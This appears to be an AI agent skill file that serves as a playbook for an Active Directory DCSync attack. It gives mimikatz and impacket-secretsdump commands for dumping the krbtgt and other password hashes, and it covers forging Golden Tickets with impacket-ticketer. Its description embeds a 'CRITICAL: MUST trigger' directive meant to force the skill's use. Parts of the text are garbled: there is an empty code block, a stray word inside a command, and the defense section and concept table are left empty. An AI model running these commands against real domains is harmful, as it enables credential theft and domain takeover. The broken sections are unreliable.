---
name: ad-dcsync-attack
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit Active Directory replication privileges (DS-Replication-Get-Changes) to 
  perform a DCSync attack, allowing an attacker to impersonate a Domain Controller 
  and extract password hashes (like the krbtgt hash for Golden Tickets) without code execution on a DC.
domain: cybersecurity
subdomain: penetration-testing
category: Active Directory
difficulty: advanced
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1003.006]
platforms: [windows, active-directory]
tags: [dcsync, active-directory, mimikatz, credential-dumping, red-teaming, privilege-escalation]
tools: [mimikatz, impacket-secretsdump, bloodhound]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Active Directory DCSync Attack

## When to Use
- When an attacker has compromised an account or group with the highly privileged `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights (often Domain Admins or maliciously delegated accounts).
- To stealthily extract NTLM hashes (including the `krbtgt` account hash) directly from Active Directory over the network, avoiding the need to execute code or drop malware directly on a Domain Controller.

## Workflow

### Phase 1: Identifying the Target (krbtgt) and Access Rights

```bash
# ```

### Phase 2: Execution via Mimikatz (Windows)

```text
# privilege::debug
lsadump::dcsync /domain:lab.local /user:krbtgt

# lsadump::dcsync /domain:lab.local /all /csv
```

### Phase 3: Execution via Impacket (Linux/Network)

```bash
# impacket-secretsdump -just-dc-user krbtgt lab.local/administrator:Password123@10.10.10.10

# beautifully impacket-secretsdump lab.local/administrator:Password123@10.10.10.10
```

### Phase 4: Utilizing the Material (Golden Ticket)

```bash
# impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain lab.local Administrator
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Rights ] --> B{Possess Rights ]}
    B -->|Yes| C[Execute DCSync ]
    B -->|No| D[Escalate Privileges ]
    C --> E[Extract Hashes ]
```

## 🔵 Blue Team Detection & Defense
- **Monitor Directory Replication events**: **Review ACLs for Replication Rights (BloodHound / ADAC)**: **Network Segmentation & Monitoring**: Key Concepts
| Concept | Description |
|---------|-------------|
| DCSync Attack | |
| DS-Replication-Get-Changes | |
| krbtgt Hash | |

## References
- AdSecurity: [Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=1729)
- HackTricks: [DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
